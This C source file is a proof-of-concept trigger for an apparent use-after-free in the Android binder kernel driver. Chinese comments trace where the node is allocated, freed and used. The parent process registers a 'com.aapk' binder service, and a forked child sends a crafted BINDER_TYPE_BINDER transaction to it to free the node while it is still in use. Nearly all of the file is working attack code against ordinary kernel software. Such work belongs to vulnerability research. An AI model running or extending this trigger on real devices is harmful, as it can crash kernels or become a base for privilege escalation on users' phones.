#include "binder.h"
#include "utils.h"
#include <signal.h>

#define COOKIE 0x424242
#define HANDLE 0xbeef

/**
 * 1. 创建的node与binder_proc相关连，新创建的node通过以下代码与当前proc关联：
 * struct binder_proc *proc = thread->proc;
 * ....省去大片代码，上下两端代码不在同一个函数内，而是两个存在调用关系的函数
 * rb_insert_color(&node->rb_node, &proc->nodes);
 * 2. 漏洞函数会从target_proc中获取其所有node，查找并获取相关的node，target_proc通过以下调用链，被传入漏洞函数：
 * binder_transaction ==> binder_proc_transaction ==> binder_transaction_buffer_release
 * 3. 现在需要将两个进程关联，父进程创建node并将其与自身proc关联，子进程冻结父进程(也可能是父进程主动冻结自己），并从父进程的proc(target_proc)
 * 中获取node并释放
 * 4. 父进程在binder_thread_read中读取node时崩溃（此步骤还没搞清楚）
 * 
 * alloc: binder_transaction->binder_new_node
 * free: binder_transaction_buffer_release
 * use: binder_thread_read->t.buffer.target_node
 */
 // trigger vulnerability
 void trigger_bug(PBINDER_INFO info, uint32_t handle){
    NEW_BINDER_OBJECT_BUILDER(bob);
    NEW_TR_BUILDER(tb);
    BYTE rbuffer[1024];
    size_t rsize = 1024;
    memset(rbuffer, 0, rsize);

    bob.set_fbo_hdr_type_(&bob, BINDER_TYPE_BINDER);
    bob.set_fbo_binder_(&bob, HANDLE);

    binder_size_t offsets[] = {0};
    tb.set_tr_target_handle_(&tb, handle);
    tb.set_tr_cookie_(&tb, 0);
    tb.set_tr_flags_(&tb, TF_ACCEPT_FDS);
    tb.set_tr_data_size_(&tb, 0);
    tb.set_tr_offsets_size_(&tb, (binder_size_t)sizeof(offsets));
    tb.set_tr_data_ptr_offsets_(&tb, (binder_uintptr_t)offsets);
    tb.set_tr_data_size_(&tb, sizeof(bob.obj_));
    tb.set_tr_data_ptr_buffer_(&tb, (binder_uintptr_t)&bob.obj_);
    
    binder_transaction(info, rbuffer, rsize, tb.tr_);
}

// getting parent process service handle and trigger vulnerability
void child(){
    printf("\nThis is child ppid: %d\n", getppid());
    BINDER_INFO info;
    PBINDER_INFO info_ptr = &info;
    int r = binder_open(info_ptr, 128*1024);
    if(r <= BINDER_VERSION_ERROR){
        fprintf(stderr, "binder driver open failed: %x", r);
        return;
    }
    uint16_t name[] = {'c', 'o', 'm', '.', 'a', 'a', 'p', 'k'};
    size_t name_len = sizeof(name);

    uint32_t handle = get_binder_service(
        info_ptr, name, name_len, COOKIE, 1, 2);
    if(!handle){
        puts("aapk handle is 0!\n");
        return;
    }
    trigger_bug(info_ptr, handle);
    binder_close(info_ptr);
}

void end(int sig){
    exit(0);
}
// create binder node and register service
void parent(){
    signal(SIGINT, end);
    BINDER_INFO info;
    PBINDER_INFO info_ptr = &info;
    
    int r = binder_open(info_ptr, 128*1024);
    if(r <= BINDER_VERSION_ERROR){
        fprintf(stderr, "binder driver open failed: %x", r);
        return;
    }

    uint16_t name[] = {'c', 'o', 'm', '.', 'a', 'a', 'p', 'k'};
    size_t name_len = sizeof(name);
    register_binder_service(
        info_ptr, name, name_len, COOKIE, HANDLE, 1, 2, 3, 4);
    //trigger_bug(info_ptr);
    CHECK(create_process(child) >= 0);
    BYTE rbuf[1024];
    size_t rsize = 1024;
    while(1){
        memset(rbuf, 0, rsize);
        binder_read(info_ptr, rbuf, rsize);
    }
    getchar();
    binder_close(info_ptr);
}

int main(int argc, char* argv[]){
    parent();
}